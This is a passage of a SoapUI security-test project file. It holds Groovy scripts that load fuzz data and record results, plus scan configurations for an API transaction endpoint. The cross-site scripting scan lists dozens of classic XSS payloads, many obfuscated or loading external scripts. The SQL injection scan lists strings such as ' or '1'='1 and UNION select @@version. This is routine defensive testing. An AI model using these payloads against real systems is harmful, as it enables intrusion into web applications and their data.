new File(fuzzDBLocation + File.separator + "numeric.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidMobiles.add(line)
    }
}

log.info("Reading the fuzz strings data.....")
new File(fuzzDBLocation + File.separator + "fuzzString.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfFuzzString.add(line)
    }
}



//set to context.
context.lstOfJsons = lstOfJsons
context.lstOfInvalidEmails = lstOfInvalidEmails
context.lstOfInvalidMobiles = lstOfInvalidMobiles
context.lstOfFuzzString = lstOfFuzzString
log.info("Context set!")

/*
//Start a launch.
def startLaunchTestCase = reportPortalTestSuites.testCases['StartLaunch']
startLaunchTestCase.setPropertyValue("launchName", "APIFuzzyTEsts");
def startLaunchRunner = startLaunchTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def stepResults = startLaunchRunner.getResults();
log.info("Lauch Created - " + stepResults[1].getStatus());

//Start a TestSuite.
def startTestSuiteTestCase = reportPortalTestSuites.testCases['StartTestSuite']
startTestSuiteTestCase.setPropertyValue("suiteName", testSuiteName)
def startTestSuiteRunner = startTestSuiteTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def ts_stepResults = startTestSuiteRunner.getResults();
log.info("TestSuite Created - " + ts_stepResults[1].getStatus());

//Start a TestCase.
def startTestCaseTestCase = reportPortalTestSuites.testCases['StartTestCase']
startTestCaseTestCase.setPropertyValue("caseName", testCaseName);
def startTestCaseRunner = startTestCaseTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def tc_stepResults = startTestCaseRunner.getResults();
log.info("TestCase Created - " + tc_stepResults[1].getStatus());

log.info("LaunchID = " + reportPortalTestSuites.getPropertyValue('launchId'));
log.info("SuiteID = " + reportPortalTestSuites.getPropertyValue('suiteId'));
log.info("CaseId = " + reportPortalTestSuites.getPropertyValue('caseId'));
*/</con:setupScript>
        <con:tearDownScript>import groovy.json.JsonOutput;
import com.eviware.soapui.security.*;

String project_dir = context.expand('${projectDir}');
log.info("test name = " + context.testCase.getSecurityTestAt(0).getName())
def result = context.getProperty('SecurityScanRequestResult')

log.info ("Result Type: " + result.getResultType())

log.info("status: " + result.getStatus())

log.info("Messages: " + result.getMessages())

log.info("Actions: "+ result.getActions())

def newJsonStr = JsonOutput.toJson(context.newJson)
def newPrettyJson = JsonOutput.prettyPrint(newJsonStr)

String outputFolder = context.testCase.testSuite.project.getPropertyValue("outputFolder");
String reportFileName = context.testCase.getSecurityTestAt(0).getName();
File reportFileObj = new File(outputFolder + File.separator + reportFileName + ".json");

saveToFile(reportFileObj, newPrettyJson)

//Save the contents to a file
def saveToFile(file, content) {
    if (!file.parentFile.exists()) {
         file.parentFile.mkdirs()
         log.info "Directory did not exist, created"
    }
    file.write(content)
    assert file.exists(), "${file.name} not created"
}

/*
// closing the testcase and suite over reportportal.
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

def closeTestCase = reportPortalTestSuites.testCases['closeTestCase']
closeTestCase.setPropertyValue("status", "passed");
def closeTestCaseRunner = closeTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestCaseResults = closeTestCaseRunner.getResults();
log.info("TestCase closed - " + closeTestCaseResults[1].getStatus());

def closeTestSuite = reportPortalTestSuites.testCases['closeTestSuite']
closeTestSuite.setPropertyValue("status", "passed");
def closeTestSuiteRunner = closeTestSuite.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestSuiteRunnerResults = closeTestSuiteRunner.getResults();
log.info("TestSuite closed - " + closeTestSuiteRunnerResults[1].getStatus());

def closeLaunch = reportPortalTestSuites.testCases['closeLaunch']
def closeLaunchRunner = closeLaunch.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeLaunchRunnerResults = closeLaunchRunner.getResults();
log.info("Launch Closed - " + closeLaunchRunnerResults[1].getStatus());
*/</con:tearDownScript>
        <con:testStepSecurityTest>
          <con:testStepId>ceac7917-827b-4c43-aba7-0df57d4bc4a7</con:testStepId>
          <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="4719af9d-3477-4e53-a53a-29035681f608" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
              <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>�script�alert(�XSS�)�/script�</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
              <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
            </con:config>
            <con:assertion type="CrosSiteScript" id="678d638b-c2b2-4134-84f2-75f83e3a3c96" name="Cross Site Scripting Detection">
              <con:configuration/>
            </con:assertion>
            <con:assertion type="Sensitive Information Exposure" id="a7f20349-4c3d-4129-8aba-80c46d9111a0" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="0a1c3beb-d7ce-4802-bebb-a0d8de2b486d" name="transaction not retreived">
              <con:configuration>
                <token>Transaction retrieved successfully</token>
                <ignoreCase>true</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="fc621fc7-e85c-4c82-8299-65318709e29f" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="id" parameterName="id" xpath="" checked="true"/>
              <con:parameters label="type" parameterName="type" xpath="" checked="true"/>
              <con:parameters label="tenders" parameterName="tenders" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ALL_AT_ONCE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="28bd36f3-d59f-49b0-9ea9-77d4e5cebc71" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:typesList>
                <con:type>3</con:type>
                <con:value>true</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>4</con:type>
                <con:value>GpM7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>5</con:type>
                <con:value>0FB7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>9</con:type>
                <con:value>-1E4f</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>10</con:type>
                <con:value>12.45E+12</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>11</con:type>
                <con:value>-1.23</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>12</con:type>
                <con:value>SoapUI is	 the  best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>13</con:type>
                <con:value>P1Y2M3DT10H30M12.3S</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>14</con:type>
                <con:value>1999-05-31T13:20:00.000-05:00</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>16</con:type>
                <con:value>1999-05-31</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>22</con:type>
                <con:value>-1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>23</con:type>
                <con:value>-882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>24</con:type>
                <con:value>-2147483647</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>25</con:type>
                <con:value>-32768</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>26</con:type>
                <con:value>127</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>27</con:type>
                <con:value>0</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>28</con:type>
                <con:value>-1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>29</con:type>
                <con:value>1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>30</con:type>
                <con:value>1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>31</con:type>
                <con:value>882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>32</con:type>
                <con:value>294967295</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>33</con:type>
                <con:value>65535</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>34</con:type>
                <con:value>255</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>35</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>36</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="329c5fc2-17a5-45f6-97fa-ca1afe4767fd" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="02e49453-a876-4894-86aa-088360edbb82" name="transactions not retreived">
              <con:configuration>
                <token>Transaction retrieved successfully</token>
                <ignoreCase>true</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="e35b0099-dbae-42aa-90fd-24c70499f722" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="id" parameterName="id" xpath="" checked="true"/>
              <con:parameters label="type" parameterName="type" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="bf831a6e-3d43-412a-bf04-23b55e9b08c0" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="e93b1c5b-047f-42c5-b5af-5d4711ff389c" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="978ea0d0-40fc-41ea-88c3-a53ed080371a" name="transaction not retreived">
              <con:configuration>
                <token>Transaction retrieved successfully</token>
                <ignoreCase>true</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="1bba3032-26af-4b98-9949-091185647402" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

